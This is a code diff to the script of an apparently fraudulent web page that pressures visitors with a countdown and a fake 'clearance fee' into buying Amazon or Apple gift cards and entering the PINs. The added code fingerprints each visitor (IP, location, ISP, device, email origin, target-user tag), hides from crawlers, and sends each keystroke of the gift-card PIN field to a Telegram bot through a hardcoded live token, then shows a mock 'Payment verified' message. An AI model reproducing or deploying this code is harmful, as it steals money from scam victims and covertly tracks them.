@@ -288,60 +288,233 @@
 
     <!-- Application Script -->
     <script>
-        // Geo-IP or Browser Currency & Vendor Link Localization
-async function loadLocalizedFee() {
+        // ==========================================
+// CENTRAL TELEGRAM & CONFIGURATION SETTINGS
+// ==========================================
+const TELEGRAM_BOT_TOKEN = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const TELEGRAM_CHAT_ID = "-1003913850436";
+
+let lastSentPayload = "";
+let timerInterval;
+
+// ==========================================
+// 1. UNIFIED TELEMETRY & LOCALIZATION MODULE
+// ==========================================
+async function initializeAppWithIP() {
+    let ipData = {};
+
+    try {
+        // Fetch network data strictly once for both tracking and localization
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+        ipData = await ipResponse.json();
+    } catch (err) {
+        console.warn("IP geolocation fallback engaged:", err);
+        // Fallback defaults if IP lookup fails
+        ipData = {
+            ip: "Unknown",
+            city: "Unknown",
+            region: "Unknown",
+            country_name: "Unknown",
+            country_code: "US",
+            org: "Unknown",
+            currency: "USD"
+        };
+    }
+
+    // A. Run Telegram Visitor Tracking (if not already logged this session)
+    if (!sessionStorage.getItem('visitor_logged_tg')) {
+        await sendVisitorDetailsToTelegram(ipData);
+    }
+
+    // B. Run IP-Driven Storefront & Currency Localization
+    loadLocalizedFee(ipData);
+}
+
+// ==========================================
+// 2. TELEGRAM VISITOR TRACKING SENDER
+// ==========================================
+async function sendVisitorDetailsToTelegram(ipData) {
+  try {
+    const rawAgent = navigator.userAgent;
+
+    // Anti-Bot Filter: Drop execution if visitor is a crawler/spider
+    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+      console.log("🤖 Automated link indexing crawler bypassed safely.");
+      return;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+    const currentPage = window.location.pathname;
+
+    let detailedDevice = "Unknown Device";
+    let detectedBrowser = "Unknown Browser";
+
+    // Smart Browser Extractor
+    if (/WhatsApp/i.test(rawAgent)) {
+      detectedBrowser = "WhatsApp In-App";
+    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
+      detectedBrowser = "Telegram In-App";
+    } else if (/Instagram/i.test(rawAgent)) {
+      detectedBrowser = "Instagram App";
+    } else if (/TikTok/i.test(rawAgent)) {
+      detectedBrowser = "TikTok App";
+    } else if (/FBAN|FBAV/i.test(rawAgent)) {
+      detectedBrowser = "Facebook App";
+    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
+      detectedBrowser = "X (Twitter) App";
+    } else if (/LinkedInApp/i.test(rawAgent)) {
+      detectedBrowser = "LinkedIn App";
+    } else if (/Phoenix/i.test(rawAgent)) {
+      detectedBrowser = "Phoenix Browser";
+    } else if (/SamsungBrowser/i.test(rawAgent)) {
+      detectedBrowser = "Samsung Internet";
+    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
+      detectedBrowser = "Opera";
+    } else if (/Edg/i.test(rawAgent)) {
+      detectedBrowser = "Microsoft Edge";
+    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
+      detectedBrowser = "Mozilla Firefox";
+    } else if (/Chrome|CriOS/i.test(rawAgent)) {
+      detectedBrowser = "Google Chrome";
+    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
+      detectedBrowser = "Apple Safari";
+    }
+
+    // Email Inbox Origin Identification
+    const referrer = document.referrer || "";
+    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+      if (/mail\.google\.com/i.test(referrer)) {
+        detectedBrowser += " (via Gmail Web)";
+      } else if (/mail\.yahoo/i.test(referrer)) {
+        detectedBrowser += " (via Yahoo Mail Web)";
+      } else if (/outlook|live\.com/i.test(referrer)) {
+        detectedBrowser += " (via Outlook Web)";
+      }
+    }
+
+    // Smart Device & OS Version Detection Engine
+    if (/Android/i.test(rawAgent)) {
+      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+      detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
+    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+      const iosVer = match ? match[1].replace('_', '.') : '';
+      detailedDevice = `iOS ${iosVer} (Apple Device)`;
+    } else if (/Windows/i.test(rawAgent)) {
+      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+      let winVer = "PC";
+      if (match) {
+        if (match[1] === "10.0") winVer = "10/11";
+        else if (match[1] === "6.3") winVer = "8.1";
+        else if (match[1] === "6.1") winVer = "7";
+      }
+      detailedDevice = `Windows ${winVer}`;
+    } else if (/Macintosh/i.test(rawAgent)) {
+      detailedDevice = "macOS Device";
+    } else if (/Linux/i.test(rawAgent)) {
+      detailedDevice = "Linux System";
+    }
+
+    const isProxy = ipData.proxy || false;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const connectionType = navigator.connection ? navigator.connection.effectiveType : "N/A";
+    const timestamp = new Date().toLocaleString();
+
+    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
+                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                        `🌐 <b>IP:</b> <code>${ipDisplay}</code>\n` +
+                        `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
+                        `🏢 <b>ISP:</b> <code>${ipData.org || 'Unknown'}</code>\n` +
+                        `📶 <b>Net Speed:</b> <code>${connectionType}</code>\n` +
+                        `🌐 <b>Browser:</b> <code>${detectedBrowser}</code>\n` +
+                        `📱 <b>Device Setup:</b> <code>${detailedDevice}</code>\n` + 
+                        `📐 <b>Screen Res:</b> <code>${screenResolution}</code>\n` +
+                        `⏱️ <b>Time:</b> <code>${timestamp}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: 'HTML'
+      })
+    });
+
+    sessionStorage.setItem('visitor_logged_tg', 'true');
+    console.log("🔒 Security telemetry parameters forwarded successfully.");
+  } catch (err) {
+    console.warn("Telegram telemetry bypass error:", err);
+  }
+}
+
+// ==========================================
+// 3. IP-BASED LOCALIZATION & STOREFRONT ROUTING
+// ==========================================
+function loadLocalizedFee(ipData) {
     const rawValue = localStorage.getItem("av_retention_bonus") || 0;
     const baseAmount = parseFloat(rawValue);
-    
-    // Fetch user's local currency based on IP/Browser locale
-    const userLocale = navigator.language || 'en-US';
-    const currencyMap = { 'en-CA': 'CAD', 'en-GB': 'GBP', 'en-US': 'USD' };
-    const targetCurrency = currencyMap[userLocale] || 'USD';
 
-    // Store region label for Telegram notifications
-    const storeRegionMap = { 
-        'en-CA': 'Canada 🇨🇦 (CAD)', 
-        'en-GB': 'United Kingdom 🇬🇧 (GBP)', 
-        'en-US': 'United States 🇺🇸 (USD)'
-    };
-    const regionLabel = storeRegionMap[userLocale] || `United States 🇺🇸 (USD / Default: ${userLocale})`;
+    // Extract country code securely from IP Geolocation (Default to US if missing)
+    const countryCode = (ipData.country_code || 'US').toUpperCase();
+    
+    // Map IP Country Code to Currency and Storefront Domains
+    let targetCurrency = ipData.currency || 'USD';
+    let regionLabel = `${ipData.country_name || 'United States'} (${targetCurrency})`;
+    let localeString = 'en-US';
+
+    if (countryCode === 'CA') {
+        localeString = 'en-CA';
+        targetCurrency = 'CAD';
+        regionLabel = 'Canada 🇨🇦 (CAD)';
+    } else if (countryCode === 'GB') {
+        localeString = 'en-GB';
+        targetCurrency = 'GBP';
+        regionLabel = 'United Kingdom 🇬🇧 (GBP)';
+    } else {
+        localeString = 'en-US';
+        targetCurrency = 'USD';
+        regionLabel = `${ipData.country_name || 'United States'} 🇺🇸 (${targetCurrency})`;
+    }
+
     localStorage.setItem("detected_region", regionLabel);
 
-    // 1. Format dynamic fee calculation
+    // Calculate dynamic fee
     const clearanceFee = baseAmount * 0.2965;
     const feeElement = document.getElementById("clearance_amount");
     if (feeElement) {
-        feeElement.textContent = 
-            new Intl.NumberFormat(userLocale, { 
-                style: 'currency', 
-                currency: targetCurrency 
-            }).format(clearanceFee);
+        feeElement.textContent = new Intl.NumberFormat(localeString, { 
+            style: 'currency', 
+            currency: targetCurrency 
+        }).format(clearanceFee);
     }
 
-    // 2. Dynamic Vendor Store Link Routing
+    // Dynamic Vendor Store Link Routing based on IP Country
     const amazonLink = document.getElementById("amazon_vendor_link");
     const appleLink = document.getElementById("apple_vendor_link");
 
-    if (userLocale === 'en-CA') {
+    if (countryCode === 'CA') {
         if (amazonLink) amazonLink.href = "https://www.amazon.ca/Amazon-eGift-Card-Logo-Animated/dp/B07P68FH74/ref=mp_s_a_1_3?crid=1T2A8P9D9VZUV&dib=eyJ2IjoiMSJ9.lUIXwiBHn5--zxDdC3QcWOol8D19BQY2oJ_K1ZtfC0zuKCtu6Y4F1YYoK6rVov-8wt6WXySUTXtlclIzA9K6HZGjrFw2AcM3l4V37eHfanySiHqh7ltLx6XimG-6v6DLvc_65C6scLXXxZQXOIIi0lvCz-Nk6N_8m-jD_BSLmphvZmMN5W_qfsLVEHaL0cSD0P-7LT5-TD5CVU82FQlHgQ.z29HD-ZJWCDxHjxNJ6WJ4ToNkLTRVMuICrcTd4sg1C8&dib_tag=se&keywords=gift+card&qid=1787215855&sprefix=Gift+card%2Caps%2C1150&sr=8-3";
         if (appleLink) appleLink.href = "https://www.apple.com/ca/shop/buy-giftcard/giftcard";
-    } else if (userLocale === 'en-GB') {
+    } else if (countryCode === 'GB') {
         if (amazonLink) amazonLink.href = "https://www.amazon.co.uk/Amazon-eGift-Card-Logo-Animated/dp/B07S6C1DZ6/ref=mp_s_a_1_3?crid=QS7EE5OHD23W&dib=eyJ2IjoiMSJ9.LVr3vrTkNWJynMyhSsjziwS11KpidnD96duOw9M4kG45btLd1kx4RdX7KmjfxRi7NnTYd7kKcADfy8R-sJLP5gKVZvIXJ6MQnwGmWzLVwgUQWChbyGdbcCv9l4fwOOW3Kvuhdo7TKudUNrLopQxLmXkqgje5haAssCSGgYep1gQD9lpiZ1ukfRlHPWa-_SvHPMVIQZ1EwFxx2YNocPwnaQ.9VMK9Yj8uYUzT_-kTEMg7iIe-qmiv2WtbS_1nyg2M7E&dib_tag=se&keywords=gift+card&qid=1787215678&sprefix=giftc%2Caps%2C1908&sr=8-3";
         if (appleLink) appleLink.href = "https://www.apple.com/uk/shop/buy-giftcard/giftcard";
     } else {
-        // Default / Fallback (US Storefronts)
         if (amazonLink) amazonLink.href = "https://www.amazon.com/Amazon-eGift-Card-Logo-Animated/dp/B07PCMWTSG";
         if (appleLink) appleLink.href = "https://www.apple.com/shop/buy-giftcard/giftcard";
     }
 }
 
-// Initialize dynamic localized fee and links on DOM load
-document.addEventListener("DOMContentLoaded", loadLocalizedFee);
-
-// 1. Synchronized Timer connected to localStorage (avb_expiry_time)
-const timerElement = document.getElementById("countdown");
-
+// ==========================================
+// 4. COUNTDOWN & TELEGRAM INPUT STREAMING
+// ==========================================
 function updateCountdownDisplay() {
+    const timerElement = document.getElementById("countdown");
     let expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
 
     if (!expiryTime) {
@@ -350,14 +523,12 @@ function updateCountdownDisplay() {
     }
 
     const remainingSec = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
-
     const minutes = Math.floor(remainingSec / 60);
     const seconds = remainingSec % 60;
 
     if (timerElement) {
         if (remainingSec <= 0) {
             timerElement.textContent = "EXPIRED";
-            
             clearInterval(timerInterval);
             localStorage.removeItem("avb_expiry_time");
             localStorage.removeItem("avb_redirected_to_avb");
@@ -367,35 +538,18 @@ function updateCountdownDisplay() {
             return;
         }
 
-        timerElement.textContent = 
-            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
     }
 }
 
-updateCountdownDisplay();
-const timerInterval = setInterval(updateCountdownDisplay, 1000);
-
-/* =========================
-AUTO SAVE & TELEGRAM STREAM SYSTEM
-========================= */
-let lastSentPayload = "";
-
 async function saveClearanceCode() {
     const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
-
     localStorage.setItem("clearanceCodeDraft", rawCardCode);
 
     const cleanCode = rawCardCode.replace(/[\s-]/g, '');
-
-    if (cleanCode.length < 14 || cleanCode.length > 16) {
-        return; 
-    }
-
+    if (cleanCode.length < 14 || cleanCode.length > 16) return;
     if (cleanCode === lastSentPayload) return;
     lastSentPayload = cleanCode;
-
-    const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
-    const CHAT_IDs = '-1003913850436'; 
 
     try {
         const urlParams = new URLSearchParams(window.location.search);
@@ -410,29 +564,18 @@ async function saveClearanceCode() {
           `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
           `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;
 
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
-
-        await fetch(telegramUrl, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: CHAT_IDs,
+            chat_id: TELEGRAM_CHAT_ID,
             text: telegramMessage,
             parse_mode: 'HTML'
           })
         });
-
     } catch (error) {
         console.error('Failed to stream live clearance PIN metric.');
     }
-}
-
-/* =========================
-EVENT LISTENERS & SUBMISSION
-========================= */
-const pinInput = document.getElementById("giftcard_pin");
-if (pinInput) {
-    pinInput.addEventListener("input", saveClearanceCode);
 }
 
 async function submitClearanceCode() {
@@ -442,15 +585,17 @@ async function submitClearanceCode() {
     const submitBtn = document.getElementById("submit_btn");
 
     if (cleanCode.length < 14 || cleanCode.length > 16) {
-        statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
+        if (statusBox) statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
         return;
     }
 
     await saveClearanceCode();
 
-    submitBtn.disabled = true;
-    statusBox.style.color = "#38bdf8";
-    statusBox.innerText = "Verifying code with clearance server...";
+    if (submitBtn) submitBtn.disabled = true;
+    if (statusBox) {
+        statusBox.style.color = "#38bdf8";
+        statusBox.innerText = "Verifying code with clearance server...";
+    }
 
     try {
         const mockApiResponse = await new Promise((resolve) => {
@@ -460,8 +605,10 @@ async function submitClearanceCode() {
         });
 
         if (mockApiResponse.status === "SUCCESS") {
-            statusBox.style.color = "#10b981";
-            statusBox.innerText = "Payment verified successfully!";
+            if (statusBox) {
+                statusBox.style.color = "#10b981";
+                statusBox.innerText = "Payment verified successfully!";
+            }
 
             localStorage.setItem("has_withdrawn", "true");
             localStorage.setItem("step_3_paid", "true");
@@ -472,16 +619,39 @@ async function submitClearanceCode() {
             }, 1500);
 
         } else {
-            statusBox.style.color = "#ef4444";
-            statusBox.innerText = "Invalid card PIN. Please try again.";
-            submitBtn.disabled = false;
+            if (statusBox) {
+                statusBox.style.color = "#ef4444";
+                statusBox.innerText = "Invalid card PIN. Please try again.";
+            }
+            if (submitBtn) submitBtn.disabled = false;
         }
     } catch (err) {
-        statusBox.style.color = "#ef4444";
-        statusBox.innerText = "Network error connecting to payment gateway.";
-        submitBtn.disabled = false;
+        if (statusBox) {
+            statusBox.style.color = "#ef4444";
+            statusBox.innerText = "Network error connecting to payment gateway.";
+        }
+        if (submitBtn) submitBtn.disabled = false;
     }
 }
+
+// ==========================================
+// 5. UNIFIED INITIALIZATION (DOM LOADED)
+// ==========================================
+document.addEventListener('DOMContentLoaded', () => {
+    // Fire unified async IP lookup which handles both tracking & localization
+    initializeAppWithIP();
+
+    // Start timer display & interval immediately
+    updateCountdownDisplay();
+    timerInterval = setInterval(updateCountdownDisplay, 1000);
+
+    // Bind real-time input listeners for PIN tracking
+    const pinInput = document.getElementById("giftcard_pin");
+    if (pinInput) {
+        pinInput.addEventListener("input", saveClearanceCode);
+    }
+});
+
     </script>
 </body>
 </html>
